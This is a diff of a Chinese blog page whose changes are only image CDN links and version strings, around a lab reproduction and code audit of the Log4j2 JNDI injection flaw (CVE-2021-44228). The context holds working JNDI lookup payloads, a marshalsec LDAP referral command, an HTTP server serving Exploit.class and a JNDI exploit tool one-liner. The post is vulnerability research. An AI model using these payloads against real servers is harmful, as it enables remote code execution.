@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-04-08T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:03:45.614Z">
+<meta property="article:modified_time" content="2026-05-14T13:33:24.514Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -69,7 +69,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8kw">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbj89">
 
 
   
@@ -78,7 +78,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-08T12:00:00+08:00","dateModified":"2026-05-14T18:03:45+08:00","datePublished":"2026-04-08T12:00:00+08:00","description":"","headline":"代码审计 | Log4j2 —— CVE-2021-44228  JNDI 注入与递归解析的完整链路分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/d5ebc61e/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/d5ebc61e/","keywords":"代码审计, Java, RCE, JNDI, Log4j2, CVE-2021-44228","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/c11f2eb51bf32d3660b3f05563dab2ea.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-08T12:00:00+08:00","dateModified":"2026-05-14T21:33:24+08:00","datePublished":"2026-04-08T12:00:00+08:00","description":"","headline":"代码审计 | Log4j2 —— CVE-2021-44228  JNDI 注入与递归解析的完整链路分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/d5ebc61e/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/d5ebc61e/","keywords":"代码审计, Java, RCE, JNDI, Log4j2, CVE-2021-44228","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/c11f2eb51bf32d3660b3f05563dab2ea.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -152,10 +152,10 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>添加好依赖之后效果如下：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image1.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image2.png"></p>
 <p>然后通过 Maven 下载源码，方便后面调试：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image3.png"></p>
 <hr>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="编写测试代码"><a href="#编写测试代码" class="headerlink" title="编写测试代码"></a>编写测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4jTest.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 高版本 JDK（如 8u121+）默认禁止远程对象加载，调试时需手动开启</span></span><br><span class="line">        <span class="comment">// System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span></span><br><span class="line">        <span class="comment">// System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟用户输入的恶意字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发漏洞</span></span><br><span class="line">        logger.error(<span class="string">&quot;用户输入数据: &#123;&#125;&quot;</span>, payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -165,7 +165,7 @@
 <p>执行 <code>javac Exploit.java</code> 编译成 class 文件，然后在 class 文件所在目录启动一个简单的 HTTP 服务：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5566</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image4.png"></p>
 <h3 id="启动-LDAP-转发器"><a href="#启动-LDAP-转发器" class="headerlink" title="启动 LDAP 转发器"></a>启动 LDAP 转发器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://172.16.250.1:5566/#Exploit&quot;</span> 1389</span><br></pre></td></tr></table></figure>
 
 <p>参数说明：</p>
@@ -178,7 +178,7 @@
 </li>
 <li><code>1389</code>：LDAP 服务监听的本地端口</li>
 </ul>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image5.png"></p>
 <h3 id="请求流程"><a href="#请求流程" class="headerlink" title="请求流程"></a>请求流程</h3><p>整个攻击链的请求顺序如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">受害服务器                          攻击机</span><br><span class="line">    |                                  |</span><br><span class="line">    |---① LDAP 查询请求 -------------&gt;| (marshalsec:1389)</span><br><span class="line">    |                                  |</span><br><span class="line">    |&lt;--② 返回 JNDI Reference --------| (codebase=http://攻击机:5566/)</span><br><span class="line">    |                                  |</span><br><span class="line">    |---③ HTTP 下载 Exploit.class ----&gt;| (HTTP服务:5566)</span><br><span class="line">    |                                  |</span><br><span class="line">    |&lt;--④ 返回恶意类字节码 -----------|</span><br><span class="line">    |                                  |</span><br><span class="line">    | (加载并执行恶意代码)             |</span><br></pre></td></tr></table></figure>
 
@@ -189,7 +189,7 @@
 <li>受害服务器解析该引用后，<strong>自动从 codebase 地址下载 Exploit.class 文件</strong>，然后实例化并执行恶意代码</li>
 </ol>
 <p>测试成功，弹出计算器：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image6.png"></p>
 <p>HTTP 服务日志中可以看到 <code>GET /Exploit.class</code> 的请求记录。</p>
 <hr>
 <h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>1. 把恶意代码写到静态块里更好</strong></p>
@@ -210,11 +210,11 @@
 <h3 id="使用-JNDI-工具一键利用"><a href="#使用-JNDI-工具一键利用" class="headerlink" title="使用 JNDI 工具一键利用"></a>使用 JNDI 工具一键利用</h3><p>上面是自己手动写 class 实现的，不过现在的 JNDI 利用工具有自带执行命令的功能，更加方便：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 172.16.250.1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image7.png"></p>
 <p>修改一下 payload：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://172.16.250.1:1389/jxjkff&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image8.png"></p>
 <hr>
 <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>复现完了，接下来开始审计。有几个我比较关心的问题：</p>
 <ol>
@@ -224,59 +224,59 @@
 </ol>
 <p>带着这几个问题开始跟调用链。</p>
 <h3 id="payload-入口追踪"><a href="#payload-入口追踪" class="headerlink" title="payload 入口追踪"></a>payload 入口追踪</h3><p>payload 被完整传入了 <code>error()</code> 方法：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image9.png"></p>
 <p>进入类里面，<code>message</code> 是字符串，<code>p0</code> 是 payload，没有问题：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image10.png"></p>
 <p>进入 <code>logIfEnabled</code> 方法，做了一个日志级别判断：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image11.png"></p>
 <p>进入 <code>logMessage</code> 方法，这里创建了一个对象来存储 <code>message</code> 和 <code>p0</code> 的信息：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> messageFactory.newMessage(message, p0);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image12.png"></p>
 <p>可以看到只是单纯的存储数据，没有对字符串处理，payload 放在了 <code>stringArgs</code> 这个数组里：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image13.png"></p>
 <p>然后经过 <code>logMessageSafely &gt;&gt; logMessageTrackRecursion &gt;&gt; tryLogMessage &gt;&gt; log()</code>，目前还是没有对 payload 处理，进入另一个 <code>log()</code> 方法：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image14.png"></p>
 <p>到了 <code>loggerConfig.log</code> 这里，创建了一个 <code>logEvent</code> 对象：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image15.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image15.png"></p>
 <p>这个对象里有个变量，是字符串和 payload 的组合：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image16.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image16.png"></p>
 <p>然后 <code>logEvent</code> 传入 <code>log(logEvent, LoggerConfigPredicate.ALL)</code> 里的 <code>event</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image17.png"></p>
 <p>进入 <code>processLogEvent</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image18.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image18.png"></p>
 <p>然后带着对象进入了 <code>callAppenders</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image19.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image19.png"></p>
 <p><code>controls[i].callAppender(event)</code> &gt;&gt; <code>callAppenderPreventRecursion(event)</code> &gt;&gt; <code>callAppender0(event)</code> &gt;&gt; <code>tryCallAppender(event)</code> &gt;&gt; <code>appender.append(event)</code> &gt;&gt; <code>tryAppend(event)</code> &gt;&gt; <code>directEncodeEvent(event)</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image20.png"></p>
 <hr>
 <h3 id="MessagePatternConverter：关键转折点"><a href="#MessagePatternConverter：关键转折点" class="headerlink" title="MessagePatternConverter：关键转折点"></a>MessagePatternConverter：关键转折点</h3><p>进入 <code>getLayout().encode(event, manager)</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image21.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image21.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">text</span> <span class="operator">=</span> toText((Serializer2) eventSerializer, event, getStringBuilder());</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image22.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image22.png"></p>
 <p><code>toText &gt;&gt; toSerializable &gt;&gt; formatters[i].format(event, buffer)</code>，然后是一直的循环处理。</p>
 <p>当来到<strong>第八轮循环</strong>的时候，进入了 <code>MessagePatternConverter.format</code>，这正是对 <code>$&#123;&#125;</code> 里面的数据做提取的地方：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image23.png"></p>
 <p>经过 <code>((StringBuilderFormattable) msg).formatTo(workingBuilder)</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image24.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image24.png"></p>
 <p>输入的数据被提取出来和前缀消息拼接到了 <code>workingBuilder</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image25.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image25.png"></p>
 <p>接下来有一段关键逻辑：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 workingBuilder 里面找 &quot;$&#123;&quot; 子串</span></span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 把输入的信息赋值给 value</span></span><br><span class="line">            <span class="comment">// offset 是固定的值，意思是 workingBuilder 前面的时间等信息不算，</span></span><br><span class="line">            <span class="comment">// 只会保留我们输入的信息</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image26.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image26.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置了 workingBuilder 的长度，使 workingBuilder 里没了我们输入的信息</span></span><br><span class="line">workingBuilder.setLength(offset);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image27.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image27.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把 config.getStrSubstitutor().replace(event, value) 处理完的信息拼接回 workingBuilder</span></span><br><span class="line">workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br></pre></td></tr></table></figure>
 
 <p>步入时点击选择 <code>replace</code> 函数：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image28.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image28.png"></p>
 <p><code>source</code> 就是输入的值：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入数据: $&#123;jndi:ldap://172.16.250.1:1389/jxjkff&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image29.png"></p>
 <hr>
 <h3 id="substitute：变量解析核心"><a href="#substitute：变量解析核心" class="headerlink" title="substitute：变量解析核心"></a>substitute：变量解析核心</h3><p>然后进入了 <code>substitute</code> 方法，它的作用是<strong>递归地查找并替换字符串中的 <code>$&#123;...&#125;</code> 占位符</strong>。</p>
 <p>核心能力：</p>
@@ -325,7 +325,7 @@
 <p>这里有一个防止无限递归的机制，不过处理依然有限，只能防止 <code>$&#123;a&#125;</code> → <code>$&#123;a&#125;</code> 这种死循环，对安全没有实质帮助。</p>
 <hr>
 <h3 id="resolveVariable：触发入口"><a href="#resolveVariable：触发入口" class="headerlink" title="resolveVariable：触发入口"></a>resolveVariable：触发入口</h3><p>最后到了触发 payload 的入口：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image30.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image30.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">varValue</span> <span class="operator">=</span> resolveVariable(event, varName, buf, startPos, endPos);</span><br></pre></td></tr></table></figure>
 
 <p>这个方法相当于一个调度员，会根据 <code>varName</code> 去寻找和执行对应任务，返回值为 <code>varValue</code>：</p>
@@ -334,7 +334,7 @@
 <p>接受变量名，交给 <code>resolver</code> 处理。</p>
 <hr>
 <h3 id="Interpolator：协议分发"><a href="#Interpolator：协议分发" class="headerlink" title="Interpolator：协议分发"></a>Interpolator：协议分发</h3><p><code>resolver.lookup(event, variableName)</code> 进入了 <code>Interpolator.lookup</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image31.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image31.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line"><span class="comment">// PREFIX_SEPARATOR 是固定值 &quot;:&quot;，这个会匹配第一个冒号前的内容</span></span><br></pre></td></tr></table></figure>
 
 <p>有冒号就进入 <code>if (prefixPos &gt;= 0)</code> 的判断里面：</p>
@@ -348,13 +348,13 @@
 <p>接下来是分发机构，会检测各种 <code>prefix</code> 的信息：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image32.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image32.png"></p>
 <p>总共有 12 种，获取对应的实例。<strong>没有任何过滤</strong>，不管传入什么都会来匹配。<code>&quot;jndi&quot;</code> 对应 <code>JndiLookup</code>。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">    value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>如果找到了对应的实例，就调用它的 <code>lookup</code> 方法，传入 <code>name</code> 和可选的 <code>event</code> 参数。</p>
 <p>对于 JNDI 注入，<code>lookup</code> 是 <code>JndiLookup</code>，其 <code>lookup(event, name)</code> 内部会执行 <code>JndiLookup.lookup(name)</code>，发起 JNDI 查询：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/log4j_image33.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/log4j_image33.png"></p>
 <p>这里就是执行 JNDI 查询的地方，整条链走完了。</p>
 <hr>
 <h2 id="触发条件与常见入口"><a href="#触发条件与常见入口" class="headerlink" title="触发条件与常见入口"></a>触发条件与常见入口</h2><p><strong>所有日志级别（info、error、warn 等）只要启用了，且日志消息中包含用户可控的字符串，都可能触发漏洞。</strong></p>
@@ -988,7 +988,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8l0" defer></script>
+<script src="/js/main.js?v=mp5jbj8d" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1252,7 +1252,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8l0"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbj8e"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
